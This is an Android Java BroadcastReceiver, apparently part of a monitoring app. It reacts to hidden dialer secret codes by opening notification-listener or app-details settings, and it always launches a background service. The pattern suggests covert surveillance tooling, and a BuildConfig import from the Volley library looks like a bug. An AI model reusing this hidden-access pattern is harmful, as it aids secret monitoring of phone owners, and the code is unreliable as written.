package com.behavioralanalysis.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;

import com.android.volley.BuildConfig;

public class CustomReceiver extends BroadcastReceiver {
    public CustomReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SECRET_CODE")) {
            String uri = intent.getDataString();
            String[] splited = uri.split("://");
            if (splited[1].equalsIgnoreCase("8088")) {
                context.startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            } else if (splited[1].equalsIgnoreCase("5055")) {
                Intent nIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + BuildConfig.APPLICATION_ID));
                context.startActivity(nIntent);
            }
        }

        intent = new Intent(context, MainService.class);
        context.startService(intent);
    }
}
